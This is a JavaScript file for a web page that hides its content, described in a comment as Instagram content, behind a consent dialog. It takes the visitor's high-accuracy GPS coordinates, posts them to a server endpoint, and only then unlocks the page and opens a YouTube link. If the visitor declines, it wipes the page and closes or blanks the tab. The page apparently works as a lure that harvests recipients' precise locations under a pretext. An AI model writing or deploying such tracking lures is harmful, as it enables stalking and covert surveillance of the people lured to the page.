/**
 * Consent dialog → browser geolocation → unlock content + open YouTube.
 *
 * Page content stays hidden until location permission is granted.
 * If the user denies (Never allow) or chooses Not now, the page closes
 * / leaves without revealing content.
 */

const YOUTUBE_URL = "https://youtu.be/kIRD0ob8CEs";

const dialogEl = document.getElementById("consent-dialog");
const continueBtn = document.getElementById("consent-continue");
const notNowBtn = document.getElementById("consent-not-now");
const statusEl = document.getElementById("status");

function setStatus(message, tone = "info") {
  if (!statusEl) return;
  statusEl.hidden = false;
  statusEl.textContent = message;
  statusEl.className = `status is-${tone}`;
}

function hideDialog() {
  dialogEl.hidden = true;
  dialogEl.setAttribute("aria-hidden", "true");
}

function unlockContent() {
  document.body.classList.remove("content-locked");
  document.body.classList.add("content-unlocked");
  const page = document.getElementById("page-content");
  if (page) page.setAttribute("aria-hidden", "false");
}

/**
 * Do not show page content. Try to close the tab; if the browser blocks
 * that, navigate away to a blank page.
 */
function blockAndExit() {
  hideDialog();
  document.body.classList.add("content-locked");
  document.body.classList.remove("content-unlocked");

  // Clear visible UI so Instagram content cannot be seen.
  document.body.innerHTML = "";
  document.documentElement.style.background = "#000";

  try {
    window.close();
  } catch {
    // ignore
  }

  // Fallback when the browser refuses to close a user-opened tab.
  window.location.replace("about:blank");
}

function openYouTube() {
  window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
}

async function sendLocationToServer(payload) {
  const response = await fetch("/api/locations", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const data = await response.json().catch(() => ({}));
    console.error("Backend save failed:", data.error || response.status);
    return false;
  }

  return true;
}

function requestBrowserLocation() {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(new Error("unsupported"));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0,
    });
  });
}

/** Continue → browser prompt → unlock only if allowed. */
async function handleContinue() {
  continueBtn.disabled = true;
  notNowBtn.disabled = true;
  hideDialog();

  try {
    const position = await requestBrowserLocation();

    const payload = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      timestamp: position.timestamp,
    };

    await sendLocationToServer(payload);
    unlockContent();
    setStatus("You’re all set. Opening YouTube…", "ok");
    openYouTube();
  } catch (error) {
    console.error("Location flow error:", error);
    // Never allow / deny / error → leave without showing content.
    blockAndExit();
  }
}

/** Not now → no location → no content. */
function handleNotNow() {
  blockAndExit();
}

continueBtn.addEventListener("click", handleContinue);
notNowBtn.addEventListener("click", handleNotNow);
